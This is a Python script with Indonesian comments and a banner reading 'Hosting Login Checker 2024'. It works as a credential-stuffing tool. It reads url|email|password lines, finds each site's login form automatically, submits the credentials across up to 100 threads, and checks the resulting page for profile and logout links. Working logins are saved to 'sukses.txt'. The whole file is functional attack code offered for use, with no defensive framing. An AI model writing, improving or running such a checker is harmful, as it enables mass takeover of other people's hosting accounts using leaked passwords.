import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Inisialisasi Warna
init(autoreset=True)

# Banner
def show_banner():
    banner = f"""
{Fore.RED}
██╗███╗   ███╗    ███████╗ █████╗ ███╗   ██╗███████╗
██║████╗ ████║    ██╔════╝██╔══██╗████╗  ██║╚══███╔╝
██║██╔████╔██║    ███████╗███████║██╔██╗ ██║  ███╔╝ 
██║██║╚██╔╝██║    ╚════██║██╔══██║██║╚██╗██║ ███╔╝  
██║██║ ╚═╝ ██║    ███████║██║  ██║██║ ╚████║███████╗
╚═╝╚═╝     ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
          Hosting Login Checker 2024
{Style.RESET_ALL}
{Fore.YELLOW}    #Format List : url|email|password
{Style.RESET_ALL}
"""
    print(banner)

# Fungsi untuk mencari tautan profil dan logout
def validate_dashboard(html):
    soup = BeautifulSoup(html, "html.parser")
    profile_keywords = ["/profile", "/profile.php"]
    logout_keywords = ["/logout", "/logout.php"]

    profile_found = any(
        keyword in link.get("href", "") for keyword in profile_keywords for link in soup.find_all("a", href=True)
    )
    logout_found = any(
        keyword in link.get("href", "") for keyword in logout_keywords for link in soup.find_all("a", href=True)
    )

    return profile_found and logout_found

# Fungsi login dengan validasi dashboard
def login_to_webhost(url, email, password, success_file, result_file):
    try:
        session = requests.Session()
        response = session.get(url, allow_redirects=True, timeout=10)

        # Ambil URL final setelah redirect
        final_url = response.url

        # Ambil halaman login
        soup = BeautifulSoup(response.text, "html.parser")
        email_field = soup.find("input", {"type": "email"}) or soup.find("input", {"placeholder": "Email Address"})
        password_field = soup.find("input", {"type": "password"}) or soup.find("input", {"placeholder": "Password"})
        login_button = soup.find("button", {"type": "submit"}) or soup.find("input", {"value": "Login"})

        if not (email_field and password_field and login_button):
            print(f"{Fore.RED}[+] Gagal Login {Style.RESET_ALL} {url}|{email}|{password}")
            return

        # Data login
        login_data = {
            email_field.get("name", "email"): email,
            password_field.get("name", "password"): password,
        }

        # Kirim permintaan POST untuk login
        post_response = session.post(final_url, data=login_data, timeout=10)
        if post_response.status_code != 200:
            print(f"{Fore.RED}[+] Gagal Login {Style.RESET_ALL} {url}|{email}|{password}")
            return

        # Validasi dashboard
        if not validate_dashboard(post_response.text):
            
            return

        # Login berhasil
        print(f"{Fore.GREEN}[+] Berhasil Login {Style.RESET_ALL} {url}|{email}|{password}")
        with open(success_file, 'a') as f:
            f.write(f"{url}|{email}|{password}\n")

    except Exception as e:
        print(f"{Fore.RED}[+] Gagal Login {Style.RESET_ALL} {url}|{email}|{password}")

# Fungsi untuk membaca file dengan penanganan encoding
def read_accounts(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            accounts = [line.strip() for line in file if line.strip()]
        return accounts
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Tidak dapat membaca file {file_path}. Error: {e}")
        return []

# Fungsi untuk memproses file dengan threading
def process_accounts(file_path, thread_count, success_file, result_file):
    accounts = read_accounts(file_path)
    if not accounts:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File {file_path} kosong atau tidak dapat dibaca.")
        return
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(lambda account: process_single_account(account, success_file, result_file), accounts)

# Fungsi untuk memproses satu akun
def process_single_account(account, success_file, result_file):
    try:
        url, email, password = account.strip().split('|')
        login_to_webhost(url, email, password, success_file, result_file)
    except ValueError as e:
        print(f"{Fore.RED}[+] Gagal Login {Style.RESET_ALL} {url}|{email}|{password}")

# Main program
if __name__ == "__main__":
    show_banner()

    file_path = input(f"{Fore.YELLOW}List Hosting: {Style.RESET_ALL}").strip()
    success_file = "sukses.txt"
    result_file = "berisi.txt"
    thread_count = int(input(f"{Fore.YELLOW}Thread : {Style.RESET_ALL}").strip())

    # Validasi jumlah thread
    if thread_count < 10:
        thread_count = 10
    elif thread_count > 100:
        thread_count = 100


    # Jalankan proses login
    process_accounts(file_path, thread_count, success_file, result_file)

